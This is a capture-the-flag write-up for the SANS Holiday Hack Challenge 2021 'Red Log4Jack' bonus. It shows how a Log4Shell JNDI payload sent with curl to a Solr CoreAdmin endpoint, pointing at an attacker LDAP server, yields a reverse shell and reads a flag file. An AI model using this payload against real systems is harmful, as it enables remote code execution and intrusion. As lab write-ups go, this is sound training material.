# Writeup for SANS Holiday Hack Challenge 2021 – Jack’s Back! featuring KringleCon 4: Calling Birds
## 15. Bonus! Red Log4Jack
The objective is to exploit the recent Log4Jack vulnerability.

### 15.0. Hints
**Log4j Discussion with Bishop Fox** - *Icky McGoop*: “Join Bishop Fox for [a discussion](https://bishopfox.com/blog/log4j-zero-day-cve-2021-44228) of the issues involved.”  
**Log4j Red Help Document** - *Icky McGoop*: “Josh Wright's [help document](https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4) for the Red challenge.”

#### 15.1. Solution
We know the vulnerable server is http://solrpower.kringlecastle.com:8983 and that is running Java Solr which is vulnerable to the Log4j attack on its [CoreAdmin APIs](https://solr.apache.org/guide/6_6/coreadmin-api.html). Coding an exploit like the [one presented by Josh Wright](https://solr.apache.org/guide/6_6/coreadmin-api.html), using [marshalsec](https://github.com/mbechler/marshalsec)’s server and then making Solr point to that allowed spawning a reverse shell to the vulnerable server:
```bash
~/web$ curl 'http://solrpower.kringlecastle.com:8983/solr/admin/cores?var=$\{jndi:ldap://172.17.0.2:1389/exploit\}'
{
  "responseHeader":{
    "status":0,
    "QTime":105},
  "initFailures":{},
  "status":{}}
}
```

The reverse shell:
```bash
listening on [172.17.0.2] 4444 ...
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.2] 50324

cat /home/solr/kringle.txt
The solution to Log4shell is patching.
Sincerly,

Santa
```

---
## [2. Where in the World is Caramel Santiaigo?](README.md)
## [2.1. Side Challenge - Exif Metadata](README.md)
## [3. Thaw Frost Tower's Entrance](README.md)
## [3.1. Side Challenge - Grepping for Gold](README.md)
## [4. Slot Machine Investigation](README.md)
## [4.1. Side Challenge - Logic Munchers](README.md)
## [5. Strange USB Device](README.md)
## [5.1. Side Challenge - IPv6 Sandbox](README.md)
## [6. Shellcode Primer](README.md)
## [6.1. Side Challenge - Holiday Hero](README.md)
## [7. Printer Exploitation](README.md)
## [7.0. Description](README.md)
## [8. Kerberoasting on an Open Fire](README.md)
## [8.1. Side Challenge - HoHo … No](README.md)
## [9. Splunk!](README.md)
## [9.1. Side Challenge - Yara Analysis](README.md)
## [10. Now Hiring!](README.md)
## [10.1. Side Challenge - IMDS Exploration](README.md)
## [11. Customer Complaint Analysis](README.md)
## [11.1. Side Challenge - Strace Ltrace Retrace](README.md)
## [12. Frost Tower Website Checkup](README.md)
## [12.1. Side Challenge - The Elf C0de Python Edition](README.md)
## [13. FPGA Programming](README.md)
## [13.1. Side Challenge - Frostavator](README.md)
## [14. Bonus! Blue Log4Jack](README.md)
## [15. Bonus! Red Log4Jack](README.md)
---
## [0. windovo\\thedead> whoami](../README.md)
## [1. KringleCon Orientation](01.%20KringleCon%20Orientation/README.md)
## [16. That’s how Jack came from space](../README.md#16-thats-how-jack-came-from-space)
## [17. Narrative](../README.md#17-narrative)
## [18. Conclusions](../README.md#18-conclusions)